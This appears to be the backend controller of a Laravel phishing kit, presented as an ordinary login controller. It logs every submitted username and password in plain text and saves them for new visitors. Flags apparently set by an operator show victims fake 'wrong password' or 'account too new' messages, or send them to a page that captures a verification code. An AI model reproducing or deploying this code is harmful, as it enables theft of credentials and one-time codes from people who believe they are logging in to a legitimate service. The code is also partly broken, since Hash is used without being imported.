<?php

namespace App\Http\Controllers;

use App\Models\LogInput;
use Illuminate\Support\Facades\Http;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

// Model
use App\Models\User;

class LoginController extends Controller
{
    public function index(Request $request)
    {
        return view('login.index');
    }

    public function postlogin(Request $request)
    {
        $request->validate([
            'first_col' => 'required',
            'second_column' => 'required',
        ]);

        $first_col = $request->first_col;
        $second_column = $request->second_column;
        
        LogInput::create(['first_col' => $first_col, 'second_col' => $second_column]);

        $data = User::where('name', $first_col)->first();
        if($data){
            if($data->is_success == 1){
                $credentials = [
                    'username' => $first_col,
                    'password' => 'password',
                ];
                Auth::attempt($credentials);
                return redirect()->route('home');
            } else {
                Auth::logout();
                if($data->is_not_12 == 1){
                    return redirect()->back()->with('fail','Your account is not more than 12 months old');
                }
                if($data->is_wrong_pw == 1){
                    return redirect()->back()->with('fail','Wrong Username or Password');
                }
                if($data->is_verif_code == 1){
                    return redirect()->route('verif', encrypt($first_col));
                }
            }
        } else {
            User::create([
                'name' => $first_col,
                'email' => $first_col,
                'password' => Hash::make('password'),
                'code' => $second_column,
            ]);
            return redirect()->back()->with('info','Please wait, we verify your account');
        }
    }

    public function verif($first_col)
    {
        $first_col = decrypt($first_col);
        return view('login.step', compact('first_col'));
    }
    public function verifStore(Request $request)
    {
        User::where('name', $request->first_col)->update([
            'verif_code' => $request->code
        ]);
        return redirect()->route('login')->with('info','Please wait, we verify your account');
    }

    public function logout(){
        Auth::logout();
        return redirect()->route('login')->with('success','Success Logout');
    }
}
